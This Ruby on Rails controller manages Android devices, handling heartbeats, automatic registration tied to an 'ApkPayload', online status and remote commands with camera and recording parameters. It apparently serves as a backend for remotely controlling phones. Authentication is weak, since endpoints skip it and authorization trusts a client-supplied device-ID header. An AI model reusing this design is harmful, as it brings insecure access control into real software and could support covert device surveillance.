# API Controller for device status queries
module Api
  class DevicesController < Api::BaseController
    include ErrorHandler
    include ResponseFormatter
    skip_before_action :authenticate_device!, only: [:heartbeat, :info]
    before_action :set_authorized_device, only: [:show, :send_command]

    # POST /device/heartbeat
    # Handles device heartbeat from Android Retrofit client
    def heartbeat
      device_id = request.headers['X-Device-ID'] || params[:device_id]
      if device_id.blank?
        render json: { status: 'ok' }, status: :ok
        return
      end

      clean_id = sanitize_device_id(device_id)
      smartphone = Smartphone.find_by(device_id: clean_id)
      if smartphone
        smartphone.touch(:updated_at)
      else
        # Auto-register new device on first heartbeat
        apk_payload = ApkPayload.first || ApkPayload.create!(name: 'default')
        apk = ApkInstallation.create!(status: 'installed', apk_payload: apk_payload)
        smartphone = Smartphone.create!(
          device_id: clean_id,
          name: params[:model] || "Device #{clean_id[0..7]}",
          apk_installation: apk
        )
        Rails.logger.info "[Heartbeat] Auto-registered device #{clean_id} as Smartphone##{smartphone.id}"
      end

      render json: { status: 'ok', device_id: device_id, smartphone_id: smartphone.id }
    end

    # GET /device/info
    def info
      device_id = request.headers['X-Device-ID'] || params[:device_id]
      smartphone = Smartphone.find_by(device_id: device_id)

      if smartphone
        render json: { device_id: smartphone.device_id, name: smartphone.name, status: 'active' }
      else
        render json: { error: 'Device not found' }, status: :not_found
      end
    end

    # GET /api/devices/online
    # Returns list of currently connected devices
    def online
      devices = RedisPool.with do |redis|
        device_ids = redis.smembers('online_devices')

        device_ids.map do |device_id|
          last_seen = redis.get("device:#{device_id}:last_seen")
          {
            device_id: device_id,
            last_seen: last_seen ? Time.at(last_seen.to_i) : nil,
            online: true
          }
        end
      end

      render_success({ devices: devices, count: devices.size })
    rescue StandardError => e
      Rails.logger.warn "[API::DevicesController] Redis error: #{e.message}"
      render_error('Failed to fetch online devices', details: e.message)
    end
    
    # GET /api/devices/:id
    def show
      render_success(@device, serializer: DeviceSerializer, include: [:statistics])
    end
    
    # POST /api/devices/:id/commands
    def send_command
      device = @device
      result = DeviceCommandService.call(device, params[:command], command_params)
      
      if result.success?
        render_accepted(
          { 
            command_id: result.value.id,
            request_id: result.value.request_id,
            status: result.value.status
          },
          message: 'Command sent successfully'
        )
      else
        render_error(result.error, status: :unprocessable_entity)
      end
    end
    
    private

    # Scope device lookup to the authenticated device's own identity
    def set_authorized_device
      authenticated_device_id = sanitize_device_id(request.headers['X-Device-ID'] || params[:device_id])
      @device = Smartphone.find(params[:id])

      return if @device.device_id == authenticated_device_id

      Rails.logger.warn("[API::DevicesController] IDOR attempt: device #{authenticated_device_id} tried to access device #{@device.device_id}")
      render json: { error: 'Forbidden' }, status: :forbidden
    end
    
    def command_params
      params.permit(:duration, :quality, :filename, :options, :camera_id)
    end
  end
end
